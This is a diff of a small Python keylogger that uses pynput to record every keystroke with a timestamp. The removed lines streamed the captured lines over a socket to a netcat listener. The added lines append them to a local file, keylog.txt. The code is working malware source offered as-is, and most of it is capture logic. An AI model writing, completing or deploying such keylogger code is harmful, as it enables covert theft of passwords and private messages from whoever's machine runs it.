@@ -1,22 +1,14 @@
-import ctypes
-from pynput.keyboard import Key, Listener
-import socket
+from pynput.keyboard import Key, Listener # ** need to pip install pynput **
 from datetime import datetime
-
-# configure the connection to the nc listener
-nc_host = '127.0.0.1'
-nc_port = 12345
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect((nc_host, nc_port))
 
 current_line = f"{datetime.now()} - "
 
 def on_press(key):
     global current_line
-    # if space is pressed, send the current line to the nc listener
+    # if space is pressed, write the current line to the file
     if key == Key.space or key == Key.enter:
-        sock.sendall((current_line + "\n").encode('utf-8'))
+        with open("keylog.txt", "a") as f:
+            f.write(current_line + "\n")
         current_line = f"{datetime.now()} - "
     else:
         try:
@@ -26,7 +18,6 @@ def on_press(key):
 
 def on_release(key):
     if key == Key.esc:
-        sock.close()
         return False
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
